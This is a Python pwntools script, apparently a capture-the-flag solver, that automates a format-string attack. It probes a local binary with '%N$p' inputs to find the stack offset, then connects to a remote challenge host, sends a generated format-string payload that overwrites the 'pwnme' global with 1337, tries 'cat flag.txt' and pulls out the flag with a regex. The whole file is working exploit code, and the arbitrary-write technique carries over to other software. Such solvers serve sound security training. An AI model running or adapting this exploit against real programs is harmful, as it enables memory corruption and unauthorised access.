from pwn import *
context.clear(arch = 'amd64')
#This module will only work on binaries that contain the 'pwnme' global variable, and only if the allowed user input is long enough (it should be)

def exploit(binary):
    #Finding the offset index
    i = 1
    #Note: I could do this all in one local connection with a %p%p... type payload, but I think this is slightly safer if my write length is low.
    #We still might want to adjust depending on optimization concerns.
    while True:
        p = process(binary)
        
        payload = ('%'+str(i) + '$p').encode('ascii')
        p.sendline(payload)
        try:
            p.recvuntil(b'0x')
            leak = p.recvline().decode('ascii')
            if payload in p64(int(leak, 16)):
                print('index found: ', str(i))
                index = i
                break
        except:
            pass
        i += 1
        p.close()
    flag_regex = r'flag\{[^}]+\}'

    url = f'ace-service-{binary}.chals.io'
    p = remote(url, 443, ssl=True, sni=url)
    e = ELF(binary)
    payload = fmtstr_payload(index, {e.sym['pwnme']: 1337}, 0)
    p.sendline(payload)

    try: # Do we have a shell?
        p.sendline(b'cat flag.txt')
    except: # Probably just printed the flag
        pass

    output = p.recvall(timeout=0.2)
    print(b'output:', output)
    #added encoding unicode_escape to stop it freaking out about non-standard bytes.
    flag = re.findall(flag_regex, output.decode('unicode_escape'))
    print(flag)
    if flag: # Success
        return flag[0]
    else: # Failure
        return